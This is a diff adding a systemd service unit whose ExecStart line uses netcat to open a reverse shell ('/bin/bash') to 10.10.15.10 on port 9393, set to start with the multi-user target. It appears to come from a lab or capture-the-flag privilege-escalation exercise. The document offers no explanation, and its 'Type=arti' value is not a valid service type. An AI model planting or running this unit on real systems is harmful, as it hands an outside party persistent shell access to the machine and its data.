@@ -1,0 +1,5 @@
+[Service]
+Type=arti
+ExecStart=/bin/sh -c "nc 10.10.15.10 9393 -e /bin/bash"
+[Install]
+WantedBy=multi-user.target
